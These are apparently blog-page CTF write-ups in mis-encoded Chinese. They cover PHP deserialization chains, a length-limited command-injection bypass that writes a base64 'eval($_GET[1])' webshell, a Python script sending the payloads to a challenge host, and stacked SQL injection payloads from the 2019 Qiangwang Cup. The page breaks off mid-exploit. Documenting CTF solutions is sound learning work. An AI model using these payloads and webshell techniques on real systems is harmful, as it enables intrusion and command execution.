<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Open();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;register=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//$b=new login();</span></span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671Awn"><img src="https://z3.ax1x.com/2021/03/23/671Awn.png" alt="671Awn.png"></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;login success you can to open shell file!</span><br></pre></td></tr></table></figure>



<p>å¯ä»¥çœ‹åˆ°å¿…é¡»åˆ é™¤æ‰waf.txtæ‰èƒ½è°ƒç”¨shellæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åœ¨è¿™ä¸ªåœ°æ–¹èŠ±è´¹äº†å¾ˆé•¿æ—¶é—´ï¼Œä¸€å¼€å§‹çš„æ€è·¯æ˜¯åˆ©ç”¨ä¼ªåè®®æ¥æ“ä½œæ–‡ä»¶ï¼Œä½†æ˜¯ä¼ªåè®®ä¸èƒ½åšåˆ°åˆ é™¤æ–‡ä»¶ã€‚åæ¥æƒ³åˆ°å¯ä»¥åˆ©ç”¨åŒåæ–¹æ³•ï¼ŒæŸ¥phpå†…ç½®ç±»çš„æ—¶å€™å‘ç°ZipArchiveç±»æœ‰openæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671Eoq"><img src="https://z3.ax1x.com/2021/03/23/671Eoq.png" alt="671Eoq.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671ZF0"><img src="https://z3.ax1x.com/2021/03/23/671ZF0.md.png" alt="671ZF0.md.png"></a></p>
<p>æ„é€ åˆ é™¤æ–‡ä»¶exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> ZipArchive();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;content=ZipArchive::OVERWRITE;</span><br><span class="line"><span class="variable">$a</span>-&gt;register=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//$b=new login();</span></span><br></pre></td></tr></table></figure>



<p>åˆ é™¤æˆåŠŸ</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671eYV"><img src="https://z3.ax1x.com/2021/03/23/671eYV.md.png" alt="671eYV.md.png"></a></p>
<p>æ¥ä¸‹æ¥å¯ä»¥è°ƒç”¨shellæ–¹æ³•äº†ï¼Œé™åˆ¶é•¿åº¦ä¸º10ä½å­—ç¬¦ï¼Œå¯ä»¥é‡‡ç”¨è¿½åŠ å†…å®¹çš„æ–¹å¼å†™å…¥shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;login success you can to open shell file!</span><br></pre></td></tr></table></figure>



<p>ä¸ºäº†é˜²æ­¢å‡ºç°&lt;?è¿™ç§ç‰¹æ®Šå­—ç¬¦ï¼ŒæŠŠå†…å®¹å…ˆbase64ç¼–ç åå†å†™å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;?php eval($_GET[1]);</span><br><span class="line">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure>





<p>æŠŠæ–‡ä»¶å†…å®¹åˆ†å‰²åå†™å…¥åˆ°æ–‡ä»¶åä¸­ï¼Œå› ä¸ºå†™å…¥æ—¶é—´é¡ºåºçš„åŸå› æ‰€ä»¥éœ€è¦æŠŠå‘½ä»¤å€’åºå†™å…¥ï¼Œls -tè¡¨ç¤ºæŠŠæ–‡ä»¶åæŒ‰ç…§æ—¶é—´æ’åºï¼ŒæŠŠæ‰€æœ‰æ–‡ä»¶åå†™å…¥åˆ°0è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œç„¶åsh 0æ‰§è¡Œecho PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.phpå†™å…¥æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">w&gt;hp</span><br><span class="line">w&gt;1.p\\</span><br><span class="line">w&gt;d\&gt;\\</span><br><span class="line">w&gt;\ -\\</span><br><span class="line">w&gt;e64\\</span><br><span class="line">w&gt;bas\\</span><br><span class="line">w&gt;7\|\\</span><br><span class="line">w&gt;XSk\\</span><br><span class="line">w&gt;Fsx\\</span><br><span class="line">w&gt;dFV\\</span><br><span class="line">w&gt;kX0\\</span><br><span class="line">w&gt;bCg\\</span><br><span class="line">w&gt;XZh\\</span><br><span class="line">w&gt;AgZ\\</span><br><span class="line">w&gt;waH\\</span><br><span class="line">w&gt;PD9\\</span><br><span class="line">w&gt;o\ \\</span><br><span class="line">w&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671uSU"><img src="https://z3.ax1x.com/2021/03/23/671uSU.md.png" alt="671uSU.md.png"></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Game();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Open();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;register=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;content=<span class="string">&#x27;w&gt;e64\\&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;shell&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//$b=new login();</span></span><br></pre></td></tr></table></figure>



<p>å‘½ä»¤æœ‰ç‚¹é•¿ï¼Œå†™äº†ä¸ªè„šæœ¬åˆ©ç”¨ï¼Œé¦–å…ˆæ–°å»ºäºŒåä¸ªphpæ–‡ä»¶ï¼Œä¿®æ”¹contentå±æ€§ä¸ºå¯¹åº”çš„å‘½ä»¤ï¼Œç„¶åç”Ÿæˆpayloadå†å‘èµ·è¯·æ±‚</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671KlF"><img src="https://z3.ax1x.com/2021/03/23/671KlF.md.png" alt="671KlF.md.png"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    localurl=<span class="string">&#x27;http://localhost/ctf/1/%d.php&#x27;</span> %i</span><br><span class="line">    r=requests.get(localurl)</span><br><span class="line">    payload=r.text</span><br><span class="line">    <span class="comment">#print(payload)</span></span><br><span class="line"></span><br><span class="line">    data=&#123;<span class="string">&#x27;unser&#x27;</span>:payload&#125;</span><br><span class="line">    r=requests.post(url=<span class="string">&#x27;http://cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun/?a[]=1&amp;b[]=2&#x27;</span>,data=data)</span><br><span class="line">    print(r.status_code)</span><br></pre></td></tr></table></figure>



<p>   æ‹¿åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun&#x2F;1.php?1&#x3D;system(%22cat%20&#x2F;flag%22); </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/671mWT"><img src="https://z3.ax1x.com/2021/03/23/671mWT.md.png" alt="671mWT.md.png"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-13T02:11:38.000Z" title="2021-03-13T02:11:38.000Z">2021-03-13</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-03-13T02:20:35.603Z" title="2021-03-13T02:20:35.603Z">2021-03-13</time>æ›´æ–°</span><span class="level-item">6 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦964ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">2019å¼ºç½‘æ¯webéƒ¨åˆ†å¤ç°</a></h1><div class="content"><h1 id="éšä¾¿æ³¨"><a href="#éšä¾¿æ³¨" class="headerlink" title="éšä¾¿æ³¨"></a>éšä¾¿æ³¨</h1><p>å †å æ³¨å…¥</p>
<p>æµ‹è¯•æ—¶å‘ç°è¿‡æ»¤äº†ä¸€äº›å‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAXY8.png" alt="6dAXY8.png"></p>
<p>æŸ¥çœ‹æ•°æ®åº“</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases #</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAqTP.png" alt="6dAqTP.png"></p>
<p>æŸ¥çœ‹è¡¨åï¼Œå‘ç°ä¸¤å¼ è¡¨</p>
<p>1919810931114514</p>
<p>words</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show tables from supersqli #</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAqTP.png" alt="6dAqTP.png"></p>
<p>è¡¨1919810931114514ä¸­å­˜åœ¨flagå­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAjfS.png" alt="6dAjfS.png"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>ä½¿ç”¨handlerç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;handler &#96;1919810931114514&#96;close #</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAzlQ.png" alt="6dAzlQ.png"></p>
<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>ååºåˆ—åŒ–</p>
<p>æ³¨å†Œç”¨æˆ·</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAoyd.png" alt="6dAoyd.png"></p>
<p>è¿›å…¥åå‘ç°å¯ä»¥ä¸Šä¼ å›¾ç‰‡</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAbwt.png" alt="6dAbwt.png"></p>
<p>ä¸‹è½½å¤‡ä»½æ–‡ä»¶<a target="_blank" rel="noopener" href="http://www.tar.gz/">www.tar.gz</a></p>
<p>åœ¨cookieå¤„å‘ç°åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œæ¨æµ‹æ˜¯è¦åˆ©ç”¨ååºåˆ—åŒ–ã€‚</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAfJO.png" alt="6dAfJO.png"></p>
<p>å…¨å±€æœç´¢unserializeï¼Œå®šä½åˆ°/web/controller/Index.php,ä»cookieä¸­è·å–basse64ç¼–ç åçš„userå€¼ç„¶åè¿›è¡Œååºåˆ—åŒ–</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dA2o6.png" alt="6dA2o6.png"></p>
<p>/web/controller/Profile.phpçš„Profileç±»ä¸­è°ƒç”¨äº†copyå‡½æ•°ï¼Œå¯ä»¥é‡å‘½åæ–‡ä»¶ã€‚$this-&gt;filename_tmpå’Œ$this-&gt;filenameå‡å¯æ§ï¼Œå¯ä»¥ç»“åˆä¸Šä¼ å›¾ç‰‡åŠŸèƒ½ï¼Œè°ƒç”¨upload_imgæ–¹æ³•å°†ä¸Šä¼ åçš„å›¾ç‰‡æ–‡ä»¶å‘½åä¸ºphpæ–‡ä»¶ï¼Œç›´æ¥getshellã€‚</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAWFK.png" alt="6dAWFK.png"></p>
<p>/web/controller/Register.phpä¸­çš„Registerç±»å­˜åœ¨__destructæ–¹æ³•ï¼Œåªè¦æŠŠcheckerèµ‹å€¼ä¸ºProfileç±»å³å¯è§¦å‘<code>__call</code>æ–¹æ³•</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAgdx.png" alt="6dAgdx.png"></p>
<p>Profileç±»ä¸­å­˜åœ¨<code>__callæ–¹æ³•å’Œ__getæ–¹æ³•</code>ï¼Œ<code>__call</code>æ–¹æ³•ä¸­å­˜åœ¨è°ƒç”¨å‡½æ•°çš„å¯èƒ½ï¼Œå‡½æ•°åä¸º$this-&gt;{$this-&gt;{$name}}ï¼Œè¿›å…¥<code>__call</code>æ–¹æ³•å$this-&gt;indexè®¿é—®ä¸å­˜åœ¨çš„å±æ€§ï¼Œä»è€Œè°ƒç”¨<code>__get</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>__get</code>æ–¹æ³•ä¸­æŠŠ$this-&gt;indexèµ‹å€¼ä¸ºupload_imgï¼Œè¿™æ ·<code>__call</code>ä¸­å³å¯è°ƒç”¨upload_imgã€‚exceptå±æ€§å¯æ§ï¼Œä»¤exceptå±æ€§ç­‰äº array(â€˜indexâ€™ =&gt; â€˜upload_imgâ€™)ï¼Œè¿™æ ·$this-&gt;{$this-&gt;{$name}}å°±ä¼šç­‰äº$this-&gt;indexç­‰äºupload_imgï¼Œä»è€Œèƒ½åœ¨<code>__call</code>æ–¹æ³•ä¸­è°ƒç”¨upload_imgå‡½æ•°</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAce1.png" alt="6dAce1.png"></p>
<h2 id="æ„é€ exp"><a href="#æ„é€ exp" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h2><p>Registerç±»ä¸­çš„<code>__destruct()</code>æ–¹æ³•-&gt;Profileç±»ä¸­çš„<code>__call()</code>æ–¹æ³•-&gt;Profileç±»ä¸­çš„<code>__get()</code>æ–¹æ³•-&gt;Profileç±»ä¸­çš„upload_img()æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span 